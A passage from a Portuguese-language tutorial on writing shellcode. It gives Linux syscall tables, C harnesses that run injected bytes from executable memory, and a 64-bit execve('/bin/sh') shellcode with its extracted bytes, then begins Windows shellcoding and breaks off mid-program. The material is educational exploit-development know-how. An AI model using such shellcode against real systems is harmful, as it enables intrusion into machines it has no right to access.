RSP, RBP e RIP</code> tem a função de controlar e direcionar a execução do programa.</p><p>Em outras palavras:</p><ul><li>EAX, EBX, ECX, e EDX são todos GPRs de 32-bit na plataforma x86.<li>AH, BH, CH e DH acessam os 8-bits mais altos dos GPRs.<li>AL, BL, CL, e DL acessam os 8-bits mais baixos dos GPRs.<li>ESI e EDI são usados para fazer <em>syscalls</em> no Linux.<li><em>Syscalls</em> com 6 argumentos ou menos são passados via GPRs.<li>XOR EAX, EAX é a melhor forma de zerar um registrador.<li>No Windows, todos os argumentos de função são passados pela <em>stack</em> de acordo com sua convenção de chamada.</ul><p>No próprio Linux, podemos consultar o manual da <em>syscall</em> e termos um <em>overview</em> de como funciona a <em>syscall</em> junto aos registradores:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre><td class="rouge-code"><pre><span class="nv">$ </span>man syscall

Arch/ABI    Instruction         System  Ret  Ret  Error    Notes
                                call <span class="c">#  val  val2</span>
───────────────────────────────────────────────────────────────────
alpha       callsys               v0      v0   a4   a3       1, 6
arc         trap0                 r8      r0   -    -
arm/OABI    swi NR                -       r0   -    -        2
arm/EABI    swi 0x0               r7      r0   r1   -
arm64       svc <span class="c">#0                w8      x0   x1   -</span>
blackfin    excpt 0x0             P0      R0   -    -
i386        int <span class="nv">$0x80</span>             eax     eax  edx  -
ia64        <span class="nb">break </span>0x100000        r15     r8   r9   r10      1, 6
loongarch   syscall 0             a7      a0   -    -
m68k        <span class="nb">trap</span> <span class="c">#0               d0      d0   -    -</span>
microblaze  brki r14,8            r12     r3   -    -
mips        syscall               v0      v0   v1   a3       1, 6
nios2       <span class="nb">trap                  </span>r2      r2   -    r7
parisc      ble 0x100<span class="o">(</span>%sr2, %r0<span class="o">)</span>  r20     r28  -    -
powerpc     sc                    r0      r3   -    r0       1
powerpc64   sc                    r0      r3   -    cr0.SO   1
riscv       ecall                 a7      a0   a1   -
s390        svc 0                 r1      r2   r3   -        3
s390x       svc 0                 r1      r2   r3   -        3
superh      trapa <span class="c">#31             r3      r0   r1   -        4, 6</span>
sparc/32    t 0x10                g1      o0   o1   psr/csr  1, 6
sparc/64    t 0x6d                g1      o0   o1   psr/csr  1, 6
tile        swint1                R10     R00  -    R01      1
x86-64      syscall               rax     rax  rdx  -        5
x32         syscall               rax     rax  rdx  -        5
xtensa      syscall               a2      a2   -    -


Arch/ABI      arg1  arg2  arg3  arg4  arg5  arg6  arg7  Notes
──────────────────────────────────────────────────────────────
alpha         a0    a1    a2    a3    a4    a5    -
arc           r0    r1    r2    r3    r4    r5    -
arm/OABI      r0    r1    r2    r3    r4    r5    r6
arm/EABI      r0    r1    r2    r3    r4    r5    r6
arm64         x0    x1    x2    x3    x4    x5    -
blackfin      R0    R1    R2    R3    R4    R5    -
i386          ebx   ecx   edx   esi   edi   ebp   -
ia64          out0  out1  out2  out3  out4  out5  -
loongarch     a0    a1    a2    a3    a4    a5    a6
m68k          d1    d2    d3    d4    d5    a0    -
microblaze    r5    r6    r7    r8    r9    r10   -
mips/o32      a0    a1    a2    a3    -     -     -     1
mips/n32,64   a0    a1    a2    a3    a4    a5    -
nios2         r4    r5    r6    r7    r8    r9    -
parisc        r26   r25   r24   r23   r22   r21   -
powerpc       r3    r4    r5    r6    r7    r8    r9
powerpc64     r3    r4    r5    r6    r7    r8    -
riscv         a0    a1    a2    a3    a4    a5    -
s390          r2    r3    r4    r5    r6    r7    -
s390x         r2    r3    r4    r5    r6    r7    -
superh        r4    r5    r6    r7    r0    r1    r2
sparc/32      o0    o1    o2    o3    o4    o5    -
sparc/64      o0    o1    o2    o3    o4    o5    -
tile          R00   R01   R02   R03   R04   R05   -
x86-64        rdi   rsi   rdx   r10   r8    r9    -
x32           rdi   rsi   rdx   r10   r8    r9    -
xtensa        a6    a3    a4    a5    a8    a9    -

</pre></table></code></div></div><h2 id="null-bytes-o-porquê-evitá-los">NULL bytes o porquê evitá-los</h2><p>A presença de um <em>byte</em> nulo (<em>null byte</em>, representado por <code class="language-plaintext highlighter-rouge">0x00</code>) em um <em>shellcode</em> pode causar diversos problemas, especialmente porque um <em>shellcode</em> é injetado como uma <em>string</em>. Em muitas linguagens de programação e APIs, o <em>null byte</em> é usado como um terminador de <em>string</em>, o que significa que qualquer sequência de caracteres será considerada finalizada ao encontrar um <code class="language-plaintext highlighter-rouge">0x00</code>. Assim, se um <em>shellcode</em> contiver um <em>null byte</em>, ele pode ser interpretado incorretamente como o final do código, pois funções de manipulação de memória que tratam os dados como <em>strings</em> podem truncar o <em>shellcode</em> ao encontrar o <em>null byte</em>. Isso resulta em um <em>shellcode</em> parcial sendo injetado, o que geralmente leva a falhas ou comportamentos inesperados.</p><hr /><h1 id="linux-shellcoding">Linux Shellcoding</h1><p>Para fins de teste dos <em>shellcodes</em> é interessante os injetarmos em um programa que irá executá-los simulando um cenário real de exploração, abaixo temos um programa em <code class="language-plaintext highlighter-rouge">C</code> para arquitetura 32-bits e um para 64-bits:</p><p><code class="language-plaintext highlighter-rouge">shellcodetest32.c</code>:</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c1">//gcc -fno-stack-protector -z execstack -m32 shellcodetest32.c -o shellcodetest32</span>

<span class="cp"># include &lt;stdio.h&gt;
# include &lt;string.h&gt;
# include &lt;unistd.h&gt;
# include &lt;sys/mman.h&gt;
</span>
<span class="cp"># define EXEC_MEM ((void *) 0x80000000)
</span>
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"injetar o shellcode aqui"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">mmap</span><span class="p">(</span><span class="n">EXEC_MEM</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">EXEC_MEM</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">EXEC_MEM</span><span class="p">)();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">shellcodetest64.c</code>:</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="c1">//gcc -fno-stack-protector -z execstack shellcodetest64.c -o shellcodetest64</span>

<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> 
<span class="s">"injetar o shellcode aqui"</span><span class="p">;</span> 

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">exec_mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"mmap"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>

    <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">exec_mem</span><span class="p">)();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="exemplo-1---hack-the-planet">Exemplo 1 - Hack The Planet!</h2><p>Este exemplo, por mais simples que seja nos, mostrará como um programa carrega o endereço de uma <em>string</em> em um pedaço do nosso código em tempo de execução. Esta ação é importante, pois, ao executar o <em>shellcode</em> em um ambiente desconhecido, o endereço da <em>string</em> também será desconhecido, pois o programa não será executado em um espaço de memória previsível.</p><p>Perceba também, que logo no início, utilizamos o operador <code class="language-plaintext highlighter-rouge">xor</code> para zerar alguns registradores, garantindo que nenhum <code class="language-plaintext highlighter-rouge">NULL Byte</code> entre no código de forma inesperada.</p><p><code class="language-plaintext highlighter-rouge">hack.asm</code>:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="k">SECTION</span> <span class="nv">.text</span><span class="p">]</span>

<span class="nf">global</span> <span class="nv">_start</span>

<span class="nl">_start:</span>

    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">htp</span>

    <span class="nl">init:</span>

    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>                <span class="c1">; limpando registradores</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>

    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">4</span>                   <span class="c1">; 4 é a syscall write</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">1</span>                   <span class="c1">; 1 é o stdout</span>
    <span class="nf">pop</span> <span class="nb">ecx</span>                     <span class="c1">; pega o endereço da string na stack</span>
    <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mi">18</span>                  <span class="c1">; comprimento da string</span>
    <span class="nf">int</span> <span class="mh">0x80</span>                    <span class="c1">; faz a syscall</span>

    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">1</span>                   <span class="c1">; 1 é a syscall exit, para o programa encerrar comerretamente</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">int</span> <span class="mh">0x80</span>

    <span class="nl">htp:</span>
    <span class="nf">call</span> <span class="nv">init</span>                   <span class="c1">; coloca o endereço da string na stack</span>
    <span class="kd">db</span> <span class="err">"</span><span class="nv">Hack</span> <span class="nv">The</span> <span class="nv">Plannet</span><span class="err">!"</span><span class="p">,</span><span class="mi">10</span>
</pre></table></code></div></div><p>Podemos “assemblar” e <em>linkar</em> o código:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nasm <span class="nt">-f</span> elf hack.asm
<span class="nv">$ </span>ld <span class="nt">-m</span> elf_i386 <span class="nt">-s</span> <span class="nt">-o</span> hack hack.o
</pre></table></code></div></div><p>Agora podemos utilizar o utilitário <code class="language-plaintext highlighter-rouge">objdump</code> para obtermos o <em>machine code</em> do programa:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>objdump <span class="nt">-d</span> hack
</pre></table></code></div></div><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>hack:     file format elf32-i386


Disassembly of section .text:

08049000 &lt;.text&gt;:
 8049000:       eb 19                   jmp    0x804901b
 8049002:       31 c0                   xor    %eax,%eax
 8049004:       31 db                   xor    %ebx,%ebx
 8049006:       31 d2                   xor    %edx,%edx
 8049008:       31 c9                   xor    %ecx,%ecx
 804900a:       b0 04                   mov    $0x4,%al
 804900c:       b3 01                   mov    $0x1,%bl
 804900e:       59                      pop    %ecx
 804900f:       b2 12                   mov    $0x12,%dl
 8049011:       cd 80                   int    $0x80
 8049013:       31 c0                   xor    %eax,%eax
 8049015:       b0 01                   mov    $0x1,%al
 8049017:       31 db                   xor    %ebx,%ebx
 8049019:       cd 80                   int    $0x80
 804901b:       e8 e2 ff ff ff          call   0x8049002
 8049020:       48                      dec    %eax
 8049021:       61                      popa
 8049022:       63 6b 20                arpl   %ebp,0x20(%ebx)
 8049025:       54                      push   %esp
 8049026:       68 65 20 50 6c          push   $0x6c502065
 804902b:       61                      popa
 804902c:       6e                      outsb  %ds:(%esi),(%dx)
 804902d:       6e                      outsb  %ds:(%esi),(%dx)
 804902e:       65 74 21                gs je  0x8049052
 8049031:       0a                      .byte 0xa
</pre></table></code></div></div><p>O que nos interessa no <em>output</em> é a sequência de <em>bytes</em>, podemos extraí-la em formato de <em>string</em> com o seguinte <em>oneliner</em>:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>objdump <span class="nt">-d</span> hack | <span class="nb">grep</span> <span class="s1">'^ '</span> | <span class="nb">cut</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'\x'</span><span class="nv">$i</span><span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="nb">echo</span>
</pre></table></code></div></div><p>A <em>string</em> de saída pode ser inserida no script de teste de 32-bits:</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x12\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x48\x61\x63\x6b\x20\x54\x68\x65\x20\x50\x6c\x61\x6e\x6e\x65\x74\x21\x0a</span><span class="s">"</span>
</pre></table></code></div></div><p>Ao executarmos o programa após sua compilação, o <em>shellcode</em> imprimirá o “<em>Hack The Plannet!</em>”.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./shelltest 
Hack The Plannet!
</pre></table></code></div></div><h2 id="exemplo-2---invocando-uma-shell">Exemplo 2 - Invocando uma Shell</h2><p>Desta vez, faremos um <em>shellcode</em> para arquitetura 64-bits. Este código exemplifica bem os passos de um <em>shellcode</em>, pois invoca a função <code class="language-plaintext highlighter-rouge">execve</code> que por sua vez precisa de argumentos de ponteiros para executar comandos.</p><p>Se consultarmos o <code class="language-plaintext highlighter-rouge">man</code> da <code class="language-plaintext highlighter-rouge">execve</code> veremos como funciona:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>man execve

SYNOPSIS
       <span class="c">#include &lt;unistd.h&gt;</span>

       int execve<span class="o">(</span>const char <span class="k">*</span>pathname, char <span class="k">*</span>const _Nullable argv[],
                  char <span class="k">*</span>const _Nullable envp[]<span class="o">)</span><span class="p">;</span>
...
</pre></table></code></div></div><p>Conforme o manual, pode ser observado que a função <em>execve</em> recebe os argumentos:</p><ul><li><em>pathname</em> que recebe o endereço do comando a ser executado, neste caso será utilizado “/bin/sh”<li><em>argv[]</em> sendo uma array de argumentos que deve ser iniciada com o path do programa e terminado em <em>NULL</em></ul><p>No programa abaixo, carrego o endereço de “/bin/sh” na memória como uma <em>string</em> e, em seguida, passo esse endereço para a função. Quando os ponteiros são desreferenciados, a memória de destino conterá a string “/bin/sh”.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

    <span class="nf">xor</span>    <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>             <span class="c1">; Zerando o registrador RDX</span>
    <span class="nf">mov</span>    <span class="kt">qword</span> <span class="nb">rbx</span><span class="p">,</span> <span class="err">'</span><span class="o">//</span><span class="nv">bin</span><span class="o">/</span><span class="nv">sh</span><span class="err">'</span><span class="c1">; Inserindo o comando //bin/sh em RBX</span>
    <span class="nf">shr</span>    <span class="nb">rbx</span><span class="p">,</span> <span class="mi">8</span>               <span class="c1">; Shift Right de 8 bits em RBX para limpar a / extra</span>
    <span class="nf">push</span>   <span class="nb">rbx</span>                  <span class="c1">; empurrando RBX para a Stack</span>
    
    <span class="nf">mov</span>    <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rsp</span>             <span class="c1">; Voltando o /bin/sh para RDI (argumento 1)</span>
    <span class="nf">push</span>   <span class="nb">rdx</span>                  <span class="c1">; Enviando o NULL para a pilha</span>
    <span class="nf">push</span>   <span class="nb">rdi</span>                  <span class="c1">; Enviando /bin/sh para a pilha</span>
    <span class="nf">mov</span>    <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsp</span>             <span class="c1">; Movendo ["/bin/sh", 0] para RSI (argumento 2)</span>
    <span class="nf">mov</span>    <span class="nb">rax</span><span class="p">,</span> <span class="mi">59</span>              <span class="c1">; Movendo para RAX o valor de execve</span>
    <span class="nf">syscall</span>                     <span class="c1">; Chamando a função</span>
</pre></table></code></div></div><p>Podemos “assemblar” e <em>linkar</em> o código:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nasm <span class="nt">-f</span> elf64 shell.asm
<span class="nv">$ </span>ld <span class="nt">-o</span> shell shell.o
</pre></table></code></div></div><p>Agora podemos utilizar o utilitário <code class="language-plaintext highlighter-rouge">objdump</code> para obtermos o <em>machine code</em> do programa:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>objdump <span class="nt">-d</span> shell
</pre></table></code></div></div><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>shell:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 &lt;_start&gt;:
  401000:       48 31 d2                xor    %rdx,%rdx
  401003:       48 bb 2f 2f 62 69 6e    movabs $0x68732f6e69622f2f,%rbx
  40100a:       2f 73 68 
  40100d:       48 c1 eb 08             shr    $0x8,%rbx
  401011:       53                      push   %rbx
  401012:       48 89 e7                mov    %rsp,%rdi
  401015:       52                      push   %rdx
  401016:       57                      push   %rdi
  401017:       48 89 e6                mov    %rsp,%rsi
  40101a:       b8 3b 00 00 00          mov    $0x3b,%eax
  40101f:       0f 05                   syscall
</pre></table></code></div></div><p>Assim como no <em>shellcode</em> anterior, o que nos interessa é a sequência de <em>bytes</em>, portanto podemos utilizar o mesmo <em>oneliner</em>:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>objdump <span class="nt">-d</span> shell | <span class="nb">grep</span> <span class="s1">'^ '</span> | <span class="nb">cut</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'\x'</span><span class="nv">$i</span><span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="nb">echo</span>
</pre></table></code></div></div><p>E após a compilação do programa de teste de 64-bits, temos o <em>shellcode</em> em operação:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./shellcodetest64 
sh-5.2<span class="err">$</span>
</pre></table></code></div></div><h3 id="onde-encontrar-os-números-das-syscalls">Onde encontrar os números das syscalls?</h3><p>Dentro ta estrutura do próprio Linux, podemos consultar o número de cada <em>syscall</em>, estas bibliotecas, na maioria das distribuições, está no diretório <code class="language-plaintext highlighter-rouge">/usr/include/asm</code> podendo variar de uma para outra.</p><p>No Arch Linux, utilizado para escrever este artigo, podemos, por exemplo, consultar o número da <em>syscall execve</em> na arquitetura 64-bits da seguinte forma:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /usr/include/asm/unistd_64.h | <span class="nb">grep </span>execve
<span class="c">#define __NR_execve 59</span>
</pre></table></code></div></div><hr /><h1 id="windows-x86-shellcoding">Windows x86 Shellcoding</h1><p>Desenvolver um <em>shellcode</em> para Windows, assim como para Linux, exige um bom conhecimento das funções do kernel do SO. Devido as grandes diferenças conceituais dos dois SO já citadas anteriormente, o processo de <em>shellcoding</em> no Windows se torna um pouco mais trabalhoso.</p><p>A princípio, o processo se dará com endereços codificados, não só por ser menos trabalhoso, mas por que dará uma parte do embasamento para o método de encontrar os endereços de memória em tempo de execução.</p><h2 id="shellcode-com-endereços-codificados">Shellcode com Endereços Codificados</h2><p>Assim como fizemos anteriormente, criaremos um simples programa para injetar o <em>shellcode</em> e testá-lo no ambiente simulando uma exploração de vulnerabilidade.</p><p><code class="language-plaintext highlighter-rouge">winshelltest.c</code></p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
<span class="s">"injetar o shellcode aqui"</span><span class="p">;</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">exec_mem</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Falha na alocação de memória.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>

    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">exec_mem</span><span class="p">;</span>
    <span class="n">func</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Uma vez que trabalharemos com endereços codificados, é preciso uma forma de descobrir os endereços específicos de cada função, para isso, o programa abaixo foi feito, ele nos dará 4 endereços importantes no processo: o endereço da <code class="language-plaintext highlighter-rouge">kernel32.dll</code>, o endereço da função <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec</a> para carregar os argumentos na pilha e chamar o registrador que tem o ponteiro para ela, o endereço da função <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess">ExitProcess</a> para finalizarmos o <em>shellcode</em> sem risco de <em>crash</em>, e por fim o endereço de qualquer função adicional que precisemos para o <em>shellcode</em>. É importante lembrar que a maioria das funções do Windows estão contidas nas três bibliotecas principais: <code class="language-plaintext highlighter-rouge">ntdll.dll</code>, <code class="language-plaintext highlighter-rouge">Kernel32.dll</code>e <code class="language-plaintext highlighter-rouge">KernelBase.dll</code>.</p><p>Para descobrirmos os endereços, o programa abaixo foi criado:</p><p><code class="language-plaintext highlighter-rouge">getaddr.c</code>:</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">FARPROC</span> <span class="n">fprc_func</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%s &lt;Function Name&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

